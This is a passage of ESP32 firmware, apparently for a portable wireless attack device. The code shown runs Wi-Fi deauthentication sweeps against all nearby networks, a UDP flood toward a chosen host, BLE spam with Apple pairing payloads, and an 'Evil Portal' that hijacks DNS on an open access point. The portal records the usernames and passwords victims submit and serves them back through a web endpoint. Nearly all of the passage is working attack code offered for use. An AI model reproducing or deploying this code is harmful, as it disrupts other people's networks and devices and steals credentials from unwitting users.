    vTaskDelete(NULL);
    return;
  }

  while (attackRunning && !stopRequested) {
    int targetCount = 0;

    stopPromiscuous();
    WiFi.softAPdisconnect(false);
    vTaskDelay(pdMS_TO_TICKS(150));

    int n = WiFi.scanNetworks(false, true, false, 150);
    if (n > 0) {
      for (int i = 0; i < n && targetCount < MAX_PSRAM_TARGETS; i++) {
        uint8_t* bssid = WiFi.BSSID(i);
        int      ch    = WiFi.channel(i);
        if (!bssid || !validateChannel(ch)) continue;
        char bstr[18];
        snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
          bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
        if (isOwnAP(WiFi.SSID(i).c_str(), bstr)) continue;
        memcpy(targets[targetCount].bssid, bssid, 6);
        targets[targetCount].ch = (uint8_t)ch;
        targetCount++;
      }
    }
    WiFi.scanDelete();

    for (int ch = 1; ch <= CHANNEL_MAX && !stopRequested; ch++) {
      bool any = false;
      for (int i = 0; i < targetCount; i++)
        if (targets[i].ch == ch) { any = true; break; }
      if (!any) continue;

      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      vTaskDelay(pdMS_TO_TICKS(6));

      for (int i = 0; i < targetCount && !stopRequested; i++) {
        if (targets[i].ch != ch) continue;
        sendDeauthBurst(targets[i].bssid, ch, nullptr, (intensity / 2) + 1);
        vTaskDelay(pdMS_TO_TICKS(8));
      }
    }

    esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));
    WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
    WiFi.softAPmacAddress(ownBSSIDap);
    boostTxPower();
    startPromiscuous();
    logEvent("Multichannel sweep done — AP restarted. Pkts:%lu", packetsSent);

    for (int i = 0; i < 25 && !stopRequested; i++)
      vTaskDelay(pdMS_TO_TICKS(100));
  }

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
  WiFi.softAPmacAddress(ownBSSIDap);
  boostTxPower();
  startPromiscuous();

  if (!psramAvailable && targets) free(targets);

  logEvent("Deauth-All MULTICHANNEL ended. Pkts:%lu", packetsSent);
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = stopRequested = false;
    deauthAllChHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── UDP FLOOD ───────────────────────────────────────────────────────────────
void udp_flood_task(void* param) {
  logEvent("UDP flood: %s:%d", targetIP.c_str(), targetPort);
  setLedState(LS_PURPLE);

  WiFiUDP udp;
  uint8_t pkt[1024];
  unsigned long count = 0;

  while (attackRunning && !stopRequested) {
    if (ESP.getFreeHeap() < HEAP_MIN) { logEvent("HEAP CRITICAL — UDP stopped"); break; }
    esp_fill_random(pkt, sizeof(pkt));
    if (udp.beginPacket(targetIP.c_str(), targetPort)) {
      udp.write(pkt, sizeof(pkt));
      if (udp.endPacket()) { incrementPackets(1); count++; }
    }
    vTaskDelay(1);
  }

  logEvent("UDP ended. Pkts:%lu", count);
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = stopRequested = false;
    udpTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── APPLE JUICE (BLE spam) ──────────────────────────────────────────────────
static const uint8_t AJ_DEVICES[][31] = {
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x03,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0b,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x10,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x05,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};
static const uint8_t AJ_SHORT[][23] = {
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x06,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x2b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0xc0,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0d,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x13,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x27,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0b,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x1e,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x24,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
};

void stopAppleJuice() {
  ajRunning = false;
  if (ajAdv) ajAdv->stop();
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = false; stopRequested = false;
    applejuiceTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  logEvent("Apple Juice stopped");
}

void applejuice_task(void* param) {
  logEvent("Apple Juice BLE spam started");
  setLedState(LS_PURPLE);

  static bool bleInited = false;
  if (!bleInited) {
    BLEDevice::init("AJ");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P21);
    bleInited = true;
  }

  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  if (!pAdv) {
    logEvent("AJ: getAdvertising failed");
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      attackRunning = false; stopRequested = false;
      applejuiceTaskHandle = NULL;
      xSemaphoreGive(attackMutex);
    }
    setLedState(LS_GREEN);
    vTaskDelete(NULL);
    return;
  }
  ajAdv = pAdv;
  ajRunning = true;

  while (attackRunning && !stopRequested && ajRunning) {
    BLEAdvertisementData advData;
    advData.setFlags(0x06);

    int choice = esp_random() % 2;
    if (choice == 0) {
      int di = esp_random() % (int)(sizeof(AJ_DEVICES)/sizeof(AJ_DEVICES[0]));
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        advData.addData(String((char*)AJ_DEVICES[di], 31));
      #else
        advData.addData(std::string((char*)AJ_DEVICES[di], 31));
      #endif
    } else {
      int di = esp_random() % (int)(sizeof(AJ_SHORT)/sizeof(AJ_SHORT[0]));
      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        advData.addData(String((char*)AJ_SHORT[di], 23));
      #else
        advData.addData(std::string((char*)AJ_SHORT[di], 23));
      #endif
    }

    pAdv->setAdvertisementData(advData);
    pAdv->start();
    vTaskDelay(pdMS_TO_TICKS(120));
    pAdv->stop();
    vTaskDelay(pdMS_TO_TICKS(30));
  }

  if (ajAdv) ajAdv->stop();

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = false; stopRequested = false;
    applejuiceTaskHandle = NULL;
    xSemaphoreGive(attackMutex);
  }
  setLedState(LS_GREEN);
  vTaskDelete(NULL);
}

// ─── EVIL PORTAL ─────────────────────────────────────────────────────────────
// Starts an open AP named portalSSID. DNS hijack redirects all A-queries
// to 192.168.4.1. Serves embedded captive.html + success.html from web_content.h.
// Credentials captured via POST /login → stored in credsMutex-guarded String.
// Portal is exclusive: stopAllAttacks() called first.

static DNSServer portalDns;
static bool      portalDnsRunning = false;

void stopEvilPortal() {
  if (!portalRunning) return;
  portalRunning = false;

  if (portalDnsRunning) {
    portalDns.stop();
    portalDnsRunning = false;
  }

  // Restore main AP
  String apSSID = prefs.getString("ap_ssid", AP_SSID_DEFAULT);
  String apPass = prefs.getString("ap_pass", AP_PASS_DEFAULT);
  WiFi.softAP(apSSID.c_str(), apPass.c_str(), AP_CHANNEL, 0, 4);
  WiFi.softAPmacAddress(ownBSSIDap);
  boostTxPower();

  // Restore captive DNS on main AP
  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  startPromiscuous();
  setLedState(LS_GREEN);
  logEvent("Evil Portal stopped — main AP restored");
}

void startEvilPortal(const String& ssid) {
  // Exclusive: halt all RF attacks first
  if (attackRunning || portalRunning) {
    stopAppleJuice();
    stopPromiscuous();
    dnsServer.stop();
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      stopRequested = true;
      xSemaphoreGive(attackMutex);
    }
    delay(600);
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
      attackRunning = deauthRunning = stopRequested = false;
      xSemaphoreGive(attackMutex);
    }
  }
  if (portalRunning) stopEvilPortal();

  portalSSID = ssid.length() > 0 ? ssid : PORTAL_SSID_DEFAULT;

  // Switch to open AP with portal SSID
  WiFi.softAPdisconnect(false);
  delay(200);
  WiFi.softAP(portalSSID.c_str(), NULL, AP_CHANNEL, 0, 8);
  delay(300);

  // Start portal DNS hijack on 192.168.4.1
  portalDns.start(DNS_PORT, "*", WiFi.softAPIP());
  portalDnsRunning = true;
  portalRunning    = true;

  setLedState(LS_CYAN);
  logEvent("Evil Portal UP — SSID:%s IP:%s",
    portalSSID.c_str(), WiFi.softAPIP().toString().c_str());
}

void addCredential(const String& user, const String& pass) {
  if (!credsMutex) return;
  if (xSemaphoreTake(credsMutex, pdMS_TO_TICKS(200)) != pdTRUE) return;
  unsigned long ts = millis() / 1000;
  String entry = String(ts) + "s | " + user + " | " + pass + "\n";
  if (capturedCreds.length() + entry.length() < PORTAL_CRED_MAX)
    capturedCreds += entry;
  xSemaphoreGive(credsMutex);
  logEvent("Portal cred: %s / %s", user.c_str(), pass.c_str());
}

// ─── STOP ALL ────────────────────────────────────────────────────────────────
void stopAllAttacks() {
  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    stopRequested = true;
    ajRunning = false;
    xSemaphoreGive(attackMutex);
  }

  unsigned long t0 = millis();
  while ((deauthTaskHandle || udpTaskHandle || deauthAllTaskHandle ||
          deauthAllChHandle  || beaconTaskHandle || csaTaskHandle || applejuiceTaskHandle) &&
         millis() - t0 < 2500) {
    delay(30);
  }

  if (deauthTaskHandle)    { vTaskDelete(deauthTaskHandle);    deauthTaskHandle    = NULL; }
  if (udpTaskHandle)       { vTaskDelete(udpTaskHandle);       udpTaskHandle       = NULL; }
  if (deauthAllTaskHandle) { vTaskDelete(deauthAllTaskHandle); deauthAllTaskHandle = NULL; }
  if (deauthAllChHandle)   { vTaskDelete(deauthAllChHandle);   deauthAllChHandle   = NULL; }
  if (beaconTaskHandle)    { vTaskDelete(beaconTaskHandle);    beaconTaskHandle    = NULL; }
  if (csaTaskHandle)       { vTaskDelete(csaTaskHandle);       csaTaskHandle       = NULL; }
  if (applejuiceTaskHandle){ vTaskDelete(applejuiceTaskHandle);applejuiceTaskHandle= NULL; }

  resumePromiscAfterTX();

  if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) == pdTRUE) {
    attackRunning = deauthRunning = stopRequested = false;
    xSemaphoreGive(attackMutex);
  }

  esp_wifi_set_channel(AP_CHANNEL, WIFI_SECOND_CHAN_NONE);
  setLedState(LS_GREEN);
  logEvent("All attacks stopped");
}

// ─── AUTH ─────────────────────────────────────────────────────────────────────
bool authOk(AsyncWebServerRequest* r) {
  if (apiKey.length() == 0) return true;
  if (r->hasParam("key")     && r->getParam("key")->value()     == apiKey) return true;
  if (r->hasParam("api_key") && r->getParam("api_key")->value() == apiKey) return true;
  if (r->hasHeader("X-API-Key") && r->getHeader("X-API-Key")->value() == apiKey) return true;
  r->send(401, "text/plain", "Unauthorized");
  return false;
}

// ─── WIFI SCAN ───────────────────────────────────────────────────────────────
static String htmlEncode(const String& s) {
  String o; o.reserve(s.length() + 8);
  for (char c : s) {
    if      (c == '<')  o += "&lt;";
    else if (c == '>')  o += "&gt;";
    else if (c == '&')  o += "&amp;";
    else if (c == '"')  o += "&quot;";
    else if (c == '\'') o += "&#39;";
    else                o += c;
  }
  return o;
}

String performWiFiScan() {
  bool was = promiscRunning;
  if (was) stopPromiscuous();

  int n = WiFi.scanNetworks(false, true, false, 150);

  if (was) startPromiscuous();

  if (n <= 0) {
    WiFi.scanDelete();
    return "<tr><td colspan='7' style='text-align:center;color:#666;padding:20px'>"
           "No networks found</td></tr>";
  }

  String out;
  for (int i = 0; i < n; i++) {
    uint8_t* bssid = WiFi.BSSID(i);
    char bstr[18];
    snprintf(bstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);

    String ssid = WiFi.SSID(i);
    if (isOwnAP(ssid.c_str(), bstr)) continue;

    int    rssi  = WiFi.RSSI(i);
    int    ch    = WiFi.channel(i);
    String col   = rssi > -50 ? "#0f9d58" : (rssi > -70 ? "#f4b400" : "#db4437");
    String bars  = rssi > -50 ? "▮▮▮▮" : (rssi > -60 ? "▮▮▮" : (rssi > -70 ? "▮▮" : "▮"));
    String sec   = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "WPA";
    String disp  = ssid.length() ? htmlEncode(ssid) : "<i style='color:#888'>[Hidden]</i>";

    out +=
      "<tr><td>" + String(i+1) + "</td>"
      "<td>" + disp + "</td>"
      "<td style='font-size:10px;font-family:monospace'>" + String(bstr) + "</td>"
      "<td>" + ch + "</td>"
      "<td style='color:" + col + "'>" + rssi + " " + bars + "</td>"
      "<td>" + sec + "</td>"
      "<td style='white-space:nowrap'>"
        "<button class='btn-sel' onclick=\"selTarget('" + String(bstr) + "',"
          + ch + ",'" + jsEscape(ssid) + "')\">Deauth</button> "
        "<button class='btn-csa' onclick=\"selCSA('" + String(bstr) + "',"
          + ch + ",'" + jsEscape(ssid) + "')\">CSA</button> "
        "<button class='btn-ep' onclick=\"startPortalAP('" + jsEscape(ssid) + "')\">Portal</button>"
      "</td></tr>";
  }
  WiFi.scanDelete();
  return out;
}

String performClientScan() {
  if (!clientsMutex)
    return "<tr><td colspan='5' style='text-align:center;color:#db4437;padding:12px'>"
           "Mutex not ready</td></tr>";
  if (xSemaphoreTake(clientsMutex, pdMS_TO_TICKS(200)) != pdTRUE)
    return "<tr><td colspan='5' style='text-align:center;color:#db4437;padding:12px'>"
           "Mutex timeout</td></tr>";

  if (numClients == 0) {
    xSemaphoreGive(clientsMutex);
    return "<tr><td colspan='5' style='text-align:center;color:#888;padding:20px'>"
           "No clients sniffed yet — passive scanning active...</td></tr>";
  }

  const unsigned long now = millis();
  String out; int shown = 0;

  for (int i = 0; i < numClients; i++) {
    if ((now - clients[i].lastSeen) > PROMISC_MAX_AGE) continue;
    char mstr[18];
    snprintf(mstr, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
      clients[i].mac[0],clients[i].mac[1],clients[i].mac[2],
      clients[i].mac[3],clients[i].mac[4],clients[i].mac[5]);

    out +=
      "<tr>"
      "<td style='font-size:10px;font-family:monospace'>" + String(mstr) + "</td>"
      "<td>" + clients[i].rssi + " dBm</td>"
      "<td>" + clients[i].channel + "</td>"
      "<td>" + String((now - clients[i].lastSeen)/1000) + "s ago</td>"
      "<td><button class='btn-sel' onclick=\""
        "document.getElementById('clientInput').value='" + String(mstr) + "';"
        "document.getElementById('clientInput').style.borderColor='#db4437'"
        "\">Target</button></td>"
      "</tr>";
    shown++;
  }

  xSemaphoreGive(clientsMutex);
  if (!shown) return
    "<tr><td colspan='5' style='text-align:center;color:#888;padding:20px'>"
    "All entries stale</td></tr>";
  return out;
}

// ─── WEB SERVER SETUP ────────────────────────────────────────────────────────
void setupServer() {
  // Root — serves main UI, or captive redirect if portal is up
  server.on("/", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (portalRunning) {
      r->redirect("/captive");
      return;
    }
    r->send_P(200, "text/html", INDEX_HTML);
  });

  // ── CAPTIVE PORTAL PAGES ──────────────────────────────────────────────────
  // Served from embedded strings in web_content.h
  server.on("/captive", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send_P(200, "text/html", CAPTIVE_HTML);
  });

  server.on("/success", HTTP_GET, [](AsyncWebServerRequest* r) {
    r->send_P(200, "text/html", SUCCESS_HTML);
  });

  // Captive portal POST login — captures credentials
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest* r) {
    String user = r->hasParam("username", true) ? r->getParam("username", true)->value() : "";
    String pass = r->hasParam("password", true) ? r->getParam("password", true)->value() : "";
    if (user.length() > 0) addCredential(user, pass);
    r->redirect("/success");
  });

  // ── PORTAL CONTROL ENDPOINTS ──────────────────────────────────────────────
  server.on("/portal_start", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    String ssid = r->hasParam("ssid") ? r->getParam("ssid")->value() : PORTAL_SSID_DEFAULT;
    startEvilPortal(ssid);
    r->send(200, "text/plain", "Portal started: " + portalSSID);
  });

  server.on("/portal_stop", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    stopEvilPortal();
    r->send(200, "text/plain", "Portal stopped");
  });

  server.on("/portal_creds", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (credsMutex && xSemaphoreTake(credsMutex, pdMS_TO_TICKS(300)) == pdTRUE) {
      String out = capturedCreds;
      xSemaphoreGive(credsMutex);
      r->send(200, "text/plain", out.length() > 0 ? out : "(none)");
    } else {
      r->send(503, "text/plain", "mutex timeout");
    }
  });

  server.on("/portal_clear", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (credsMutex && xSemaphoreTake(credsMutex, pdMS_TO_TICKS(300)) == pdTRUE) {
      capturedCreds = "";
      xSemaphoreGive(credsMutex);
    }
    r->send(200, "text/plain", "Credentials cleared");
  });

  server.on("/portal_status", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    int credCount = 0;
    String s = capturedCreds;
    for (char c : s) if (c == '\n') credCount++;
    char buf[64];
    snprintf(buf, sizeof(buf), "%d,%s,%d",
      portalRunning ? 1 : 0,
      portalSSID.c_str(), credCount);
    r->send(200, "text/plain", buf);
  });

  // ── SCAN ──────────────────────────────────────────────────────────────────
  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    r->send(200, "text/html", performWiFiScan());
  });

  server.on("/scan_clients", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    r->send(200, "text/html", performClientScan());
  });

  // ── DEAUTH ────────────────────────────────────────────────────────────────
  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
      r->send(400,"text/plain","ERROR: bssid+ch required"); return;
    }
    String bstr = r->getParam("bssid")->value();
    int    ch   = r->getParam("ch")->value().toInt();
    if (!validateMAC(bstr))   { r->send(400,"text/plain","ERROR: Bad BSSID");   return; }
    if (!validateChannel(ch)) { r->send(400,"text/plain","ERROR: Bad channel"); return; }
    if (!parseMAC(bstr, targetBSSID)) { r->send(400,"text/plain","ERROR: MAC parse"); return; }
    if (isOwnAP(NULL, bstr.c_str())) { r->send(403,"text/plain","ERROR: Own AP");    return; }

    memset(targetClient, 0, 6);
    if (r->hasParam("client")) {
      String cs = r->getParam("client")->value();
      if (cs.length() > 0 && !parseMAC(cs, targetClient)) {
        r->send(400,"text/plain","ERROR: Bad client MAC"); return;
      }
    }
    if (r->hasParam("ssid"))  targetSSID = r->getParam("ssid")->value();
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    targetChannel = ch;

    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (deauthRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Already running"); return;
    }
    deauthRunning = attackRunning = true;
    stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    pausePromiscForTX();

    BaseType_t ok = xTaskCreatePinnedToCore(deauthTask, "deauth", 10240, NULL, 3,
                            &deauthTaskHandle, 0);
    if (ok != pdPASS) {
      logEvent("FAILED to create deauth task");
      deauthRunning = attackRunning = false;
      deauthTaskHandle = NULL;
      setLedState(LS_GREEN);
      r->send(500, "text/plain", "ERROR: task create failed"); return;
    }
    r->send(200,"text/plain","OK");
  });

  // ── CSA ───────────────────────────────────────────────────────────────────
  server.on("/csa", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (!r->hasParam("bssid") || !r->hasParam("ch")) {
      r->send(400,"text/plain","ERROR: bssid+ch required"); return;
    }
    String bstr = r->getParam("bssid")->value();
    int    ch   = r->getParam("ch")->value().toInt();
    if (!validateMAC(bstr) || !parseMAC(bstr, targetBSSID)) {
      r->send(400,"text/plain","ERROR: Bad BSSID"); return;
    }
    if (!validateChannel(ch))         { r->send(400,"text/plain","ERROR: Bad channel"); return; }
    if (isOwnAP(NULL, bstr.c_str())) { r->send(403,"text/plain","ERROR: Own AP");      return; }

    if (r->hasParam("ssid")) targetSSID = r->getParam("ssid")->value();
    targetChannel = ch;

    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(csa_task, "csa", 4096, NULL, 3, &csaTaskHandle, 0);
    r->send(200,"text/plain","CSA started");
  });

  // ── BEACON ────────────────────────────────────────────────────────────────
  server.on("/beacon_spam", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(beacon_spam_task, "beacon", 4096, NULL, 2,
                            &beaconTaskHandle, 0);
    r->send(200,"text/plain","Beacon spam started");
  });

  // ── DEAUTH ALL ────────────────────────────────────────────────────────────
  server.on("/deauth_all", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);

    xTaskCreatePinnedToCore(deauth_all_task, "dall", 8192, NULL, 2,
                            &deauthAllTaskHandle, 0);
    r->send(200,"text/plain","Deauth-All started");
  });

  server.on("/deauth_all_ch", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    if (r->hasParam("inten")) {
      int v = r->getParam("inten")->value().toInt();
      if      (v == 1) intensity = INTENSITY_LOW;
      else if (v == 2) intensity = INTENSITY_MED;
      else if (v == 3) intensity = INTENSITY_HIGH;
      else if (v == 4) intensity = INTENSITY_MAX;
    }
    if (xSemaphoreTake(attackMutex, SEM_TIMEOUT) != pdTRUE) {
      r->send(503,"text/plain","ERROR: Mutex timeout"); return;
    }
    if (attackRunning) {
      xSemaphoreGive(attackMutex);
      r->send(409,"text/plain","ERROR: Attack running"); return;
    }
    attackRunning = true; stopRequested = false; packetsSent = 0;
    xSemaphoreGive(attackMutex);
    xTaskCreatePinnedToCore(deauth_all_ch_task, "dallch", 10240, NULL, 2,
                            &deauthAllChHandle, 0);
    r->send(200,"text/plain","Deauth-All MULTICHANNEL ch1-13 started");
  });

  // ── STOP ──────────────────────────────────────────────────────────────────
  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest* r) {
    if (!authOk(r)) return;
    stopAllAttacks();
    r->send(200,"text/plain","Stopped");
  });

